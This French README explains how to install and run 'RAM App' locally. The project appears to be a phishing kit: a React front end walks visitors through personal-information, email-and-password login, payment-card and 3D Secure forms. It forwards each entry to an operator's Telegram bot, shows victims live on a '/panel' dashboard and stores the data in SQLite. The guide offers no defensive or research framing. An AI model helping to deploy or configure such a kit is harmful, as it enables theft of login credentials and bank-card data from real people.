# Guide de Test Local - RAM App

Ce guide explique comment tester le projet en local.

## 📋 Prérequis

- **Node.js** (version 18 ou supérieure)
- **npm** ou **yarn**
- Un **bot Telegram** configuré avec son token et chat ID

## 🚀 Installation

### 1. Installer les dépendances du client

```bash
cd ram-app/client
npm install
```

### 2. Installer les dépendances du serveur

```bash
cd ram-app/server
npm install
```

## ⚙️ Configuration

### 1. Créer le fichier `.env` pour le client

Créez un fichier `.env` dans le dossier `ram-app/client/` :

```bash
cd ram-app/client
cp .env.example .env
```

Puis éditez le fichier `.env` avec vos informations Telegram :

```env
VITE_TELEGRAM_TOKEN=votre_token_bot_telegram
VITE_TELEGRAM_CHAT_ID=votre_chat_id_telegram
VITE_WS_HOST=localhost:8090
```

**Comment obtenir un bot Telegram :**
1. Ouvrez Telegram et cherchez `@BotFather`
2. Envoyez `/newbot` et suivez les instructions
3. Copiez le token fourni
4. Pour obtenir votre Chat ID, cherchez `@userinfobot` sur Telegram et envoyez-lui un message

## 🏃 Démarrer le projet

Vous devez démarrer **2 serveurs** en parallèle :

### Terminal 1 - Serveur WebSocket

```bash
cd ram-app/server
node index.js
```

Le serveur WebSocket démarrera sur le port **8090** par défaut.

Vous devriez voir :
```
WebSocket server listening on port 8090
```

### Terminal 2 - Client React

```bash
cd ram-app/client
npm run dev
```

Le client React démarrera sur le port **3002** par défaut et s'ouvrira automatiquement dans votre navigateur.

Vous devriez voir :
```
  VITE v7.x.x  ready in xxx ms

  ➜  Local:   http://localhost:3002/
  ➜  Network: use --host to expose
```

## 🧪 Tester l'application

### 1. Tester le flux utilisateur

1. Ouvrez `http://localhost:3002/` dans votre navigateur
2. Vous serez redirigé vers `/track`
3. Remplissez le formulaire "Your informations"
4. Continuez avec le formulaire "Login" (email + mot de passe)
5. Remplissez les "Payment details"
6. Complétez le processus 3D Secure
7. Vérifiez que les messages arrivent dans Telegram

### 2. Tester le Dashboard

1. Ouvrez `http://localhost:3002/panel` dans votre navigateur
2. Vous verrez tous les clients connectés en temps réel
3. Les données s'affichent au fur et à mesure que les utilisateurs remplissent les formulaires

## 📱 URLs importantes

- **Application principale** : `http://localhost:3002/`
- **Dashboard** : `http://localhost:3002/panel`
- **WebSocket Server** : `ws://localhost:8090`

## 🔍 Vérification

### Vérifier que tout fonctionne :

1. ✅ Le serveur WebSocket répond sur le port 8090
2. ✅ Le client React tourne sur le port 3002
3. ✅ Les messages Telegram sont envoyés correctement
4. ✅ Le Dashboard affiche les clients connectés
5. ✅ Les données sont sauvegardées dans `clients.sqlite`

### Base de données

La base de données SQLite est créée automatiquement dans `ram-app/server/clients.sqlite` lors du premier démarrage.

## 🐛 Dépannage

### Le WebSocket ne se connecte pas

- Vérifiez que le serveur WebSocket est bien démarré sur le port 8090
- Vérifiez que le port 8090 n'est pas utilisé par un autre processus
- Vérifiez la variable `VITE_WS_HOST` dans le fichier `.env`

### Les messages Telegram ne sont pas envoyés

- Vérifiez que `VITE_TELEGRAM_TOKEN` et `VITE_TELEGRAM_CHAT_ID` sont correctement configurés dans `.env`
- Vérifiez que le bot Telegram est actif
- Vérifiez la console du navigateur pour les erreurs

### Le Dashboard ne charge pas

- Vérifiez que le serveur WebSocket est démarré
- Vérifiez la console du navigateur pour les erreurs de connexion WebSocket

## 📝 Commandes utiles

```bash
# Démarrer le client en mode développement
cd ram-app/client && npm run dev

# Build de production
cd ram-app/client && npm run build

# Démarrer le serveur WebSocket
cd ram-app/server && node index.js

# Voir les logs du serveur
# Les logs s'affichent directement dans le terminal où le serveur tourne
```

## 🔐 Variables d'environnement

| Variable | Description | Défaut |
|----------|-------------|--------|
| `VITE_TELEGRAM_TOKEN` | Token du bot Telegram | Requis |
| `VITE_TELEGRAM_CHAT_ID` | ID du chat Telegram | Requis |
| `VITE_WS_HOST` | Host du serveur WebSocket | `localhost:8090` |
| `PORT` ou `WS_PORT` | Port du serveur WebSocket | `8090` |

## 📦 Structure du projet

```
ram-app/
├── client/          # Application React
│   ├── src/
│   │   ├── pages/   # Pages de l'application
│   │   ├── components/ # Composants réutilisables
│   │   └── utils/    # Utilitaires (messageBuilder, validation)
│   └── .env         # Variables d'environnement
│
└── server/          # Serveur WebSocket Node.js
    ├── index.js     # Serveur principal
    └── clients.sqlite # Base de données SQLite (créée automatiquement)
```

